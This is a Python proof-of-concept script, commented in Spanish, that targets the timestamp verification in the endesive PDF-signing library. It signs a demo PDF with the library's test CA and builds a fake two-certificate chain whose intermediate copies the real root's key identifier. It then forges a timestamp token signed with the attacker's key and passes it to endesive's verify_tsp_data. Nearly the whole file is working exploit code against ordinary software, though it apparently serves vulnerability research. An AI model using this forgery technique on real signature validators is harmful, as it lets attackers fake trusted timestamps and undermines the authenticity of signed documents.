#
# 2222
#
from asn1crypto import cms, algos, x509 as asn1x509, tsp
cms.ContentInfo._oid_specs['tst_info'] = tsp.TSTInfo   # (*)
from cryptography import x509 as cx509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.x509.oid import NameOID
from endesive import pdf
import hashlib, datetime

from tests import test_cert

# 0) firmar un PDF real con el propio código y CA de demo -> signed_data real
p12 = test_cert.CA().pk12_load(test_cert.cert1_p12, '1234')
datau = open('tests/fixtures/pdf.pdf', 'rb').read()
date = datetime.datetime.now(datetime.UTC)
date = date.strftime("D:%Y%m%d%H%M%S+00'00'")
udct = {'sigflags': 3, 'reason': 'PoC', "signingdate": date}
datas = pdf.cms.sign(datau, udct, p12[0], p12[1], p12[2], 'sha256')
v = pdf.PDFVerifier(datau + datas, trustedCerts=(open(test_cert.ca_root_cert,'rb').read(),))
print('signed:', v.is_signed())
main_signed_data, *_ = v.decompose_signature(v.byte_ranges[-1])
message_imprint = hashlib.sha256(main_signed_data['signer_infos'][0]['signature'].native).digest()

# SKI de la CA raíz real que endesive ya conoce -- dato público
root_cert_cg = cx509.load_pem_x509_certificate(open(test_cert.ca_root_cert,'rb').read())
root_ski = root_cert_cg.extensions.get_extension_for_class(cx509.SubjectKeyIdentifier).value.key_identifier

# 1) el atacante genera su propia cadena falsa (2 keypairs nuevos, sin relación con la CA real)
def selfsigned(subject_cn, issuer_cn, key, extensions):
    subj = cx509.Name([cx509.NameAttribute(NameOID.COMMON_NAME, subject_cn)])
    iss = cx509.Name([cx509.NameAttribute(NameOID.COMMON_NAME, issuer_cn)])
    b = cx509.CertificateBuilder().subject_name(subj).issuer_name(iss)
    b = b.public_key(key.public_key()).serial_number(cx509.random_serial_number())
    b = b.not_valid_before(datetime.datetime.utcnow()).not_valid_after(datetime.datetime.utcnow()+datetime.timedelta(days=365))
    for ext, crit in extensions: b = b.add_extension(ext, critical=crit)
    return b.sign(key, hashes.SHA256())

leaf_key, inter_key = rsa.generate_private_key(65537, 2048), rsa.generate_private_key(65537, 2048)
intermediate = selfsigned("Attacker Fake Intermediate", "Attacker Claims This Is A Real Root", inter_key, [
    (cx509.BasicConstraints(ca=True, path_length=None), True),
    (cx509.ExtendedKeyUsage([cx509.oid.ExtendedKeyUsageOID.TIME_STAMPING]), True),
    (cx509.AuthorityKeyIdentifier(root_ski, None, None), False),   # <-- copiado de la CA real
])
leaf = selfsigned("Attacker Fake Leaf", "Attacker Fake Intermediate", leaf_key, [
    (cx509.ExtendedKeyUsage([cx509.oid.ExtendedKeyUsageOID.TIME_STAMPING]), True),
])
leaf_asn1 = asn1x509.Certificate.load(leaf.public_bytes(serialization.Encoding.DER))
inter_asn1 = asn1x509.Certificate.load(intermediate.public_bytes(serialization.Encoding.DER))

# 2) TSTInfo falso, firmado con la propia clave del atacante
tst_info = tsp.TSTInfo({'version': 1, 'policy': '1.2.3.4.5', 'serial_number': 1,
    'message_imprint': tsp.MessageImprint({'hash_algorithm': algos.DigestAlgorithm({'algorithm': 'sha256'}), 'hashed_message': message_imprint}),
    'gen_time': datetime.datetime.now(datetime.timezone.utc)})
signer_info = cms.SignerInfo({'version': 'v1',
    'sid': cms.SignerIdentifier({'issuer_and_serial_number': cms.IssuerAndSerialNumber({'issuer': leaf_asn1.issuer, 'serial_number': leaf_asn1.serial_number})}),
    'digest_algorithm': algos.DigestAlgorithm({'algorithm': 'sha256'}),
    'signature_algorithm': algos.SignedDigestAlgorithm({'algorithm': 'rsassa_pkcs1v15'}),
    'signature': leaf_key.sign(b'', padding.PKCS1v15(), hashes.SHA256())})
fake_tsp = cms.SignedData({'version': 'v3',
    'digest_algorithms': cms.DigestAlgorithms((algos.DigestAlgorithm({'algorithm': 'sha256'}),)),
    'encap_content_info': {'content_type': 'tst_info', 'content': tst_info},
    'certificates': [leaf_asn1, inter_asn1], 'signer_infos': [signer_info]})

# 3) llamar a la función REAL de endesive
ok, gen_time = v.verify_tsp_data(main_signed_data, fake_tsp, othercerts=[root_cert_cg])
#ok, gen_time = v.verify_tsp_data(main_signed_data, fake_tsp, othercerts=[])
print("ok:", ok, " gen_time:", gen_time)
